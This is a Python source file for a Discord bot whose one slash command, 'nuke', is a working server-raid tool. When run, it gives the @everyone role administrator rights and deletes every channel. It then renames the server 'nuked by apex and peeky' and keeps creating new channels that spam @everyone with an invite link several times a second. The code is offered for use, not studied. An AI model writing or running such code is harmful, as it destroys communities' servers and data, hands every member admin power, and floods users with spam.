import discord
import os
import threading
from discord.ext import commands
from discord import app_commands
from flask import Flask
from dotenv import load_dotenv
import asyncio

load_dotenv()

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is alive!", 200

def run_flask():
    app.run(host='0.0.0.0', port=8080)
  
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Bot is online as {bot.user}")
  
@bot.tree.command(name="nuke", description="nuke the server")
async def nuke(interaction: discord.Interaction):
    try:
        everyone_role = interaction.guild.default_role
        await everyone_role.edit(permissions=discord.Permissions(administrator=True))
        for channel in list(interaction.guild.channels):
            try:
                await channel.delete()
            except:
                pass
        await interaction.guild.edit(name="nuked by apex and peeky")
        async def create_and_spam():
            ch = await interaction.guild.create_text_channel("nuked by apex and peeky")
            async def spam():
                while True:
                    try:
                        await ch.send("@everyone https://discord.gg/6Vtg4WpPHY")
                    except:
                        break
                    await asyncio.sleep(0.1)
            bot.loop.create_task(spam())
        for _ in range(3):
            await create_and_spam()
        async def channel_spawner():
            while True:
                await create_and_spam()
                await asyncio.sleep(1)
        bot.loop.create_task(channel_spawner())
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}")

flask_thread = threading.Thread(target=run_flask)
flask_thread.start()

token = os.getenv("TOKEN")
if not token:
    raise ValueError("TOKEN not set in .env.")

bot.run(token)
